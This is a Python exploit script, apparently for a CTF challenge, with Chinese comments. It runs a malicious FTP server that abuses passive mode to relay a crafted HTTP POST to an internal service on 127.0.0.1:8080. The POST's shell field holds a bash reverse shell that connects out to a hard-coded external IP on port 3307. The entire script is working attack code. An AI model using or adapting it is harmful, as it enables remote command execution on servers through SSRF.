import socket
from urllib.parse import unquote
shell_ip = '8.129.42.140'
shell_port = '3307'
# 对payload进⾏⼀次urldecode
payload =unquote("POST%20/shellcheck%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContentType%3A%20application/x-www-form-urlencoded%0D%0AContentLength%3A%2083%0D%0A%0D%0Ashell%3Dbash%2520-c%2520%2522bash%2520-i%2520%253E%2526%2520/dev/tcp/{}/{}%25200%253E%25261%2522".format(shell_ip,shell_port))
payload = payload.encode('utf-8')
host = '0.0.0.0'
port = 21
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)
# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()
# 计数器，⽤于区分是第⼏次ftp连接
count = 1
while 1:
conn, address = sk.accept()
print("220 ")
conn.send(b"220 \n")
print(conn.recv(20)) # USER aaa\r\n 客⼾端传来⽤⼾名
print("220 ready")
conn.send(b"220 ready\n")
print(conn.recv(20)) # TYPE I\r\n 客⼾端告诉服务端以什么格式传输数据，TYPE I表⽰⼆进制， TYPE A表⽰⽂
print("200 ")
conn.send(b"200 \n")
print(conn.recv(20)) # PASV\r\n 客⼾端告诉服务端进⼊被动连接模式
if count == 1:
print("227 %s,4,210" % (shell_ip.replace('.', ',')))
conn.send(b"227 %s,4,210\n" % (shell_ip.replace('.', ',').encode())) #服务端告诉客⼾端需要到那个ip:port去获取数据,ip,port都是⽤逗号隔开，其中端⼝的计算规则为：4*256+210=1234
else:
print("227 127,0,0,1,31,144")
conn.send(b"227 127,0,0,1,31,144\n") # 端⼝计算规则：31*256+144=8080
print(conn.recv(20)) # 第⼀次连接会收到命令RETR /123\r\n，第⼆次连接会收到STOR/123\r\n
if count == 1:
print("125 ")
conn.send(b"125 \n") # 告诉客⼾端可以开始数据链接了
# 新建⼀个socket给服务端返回我们的payload
print("建⽴连接!")
conn2, address2 = sk2.accept()
conn2.send(payload)
conn2.close()
print("断开连接!")
else:
print("150 ")
conn.send(b"150 \n")
# 第⼀次连接是下载⽂件，需要告诉客⼾端下载已经结束
if count == 1:
print("226 ")
conn.send(b"226 \n")
print(conn.recv(20)) # QUIT\r\n
print("221 ")
conn.send(b"221 \n")
conn.close()
count += 1
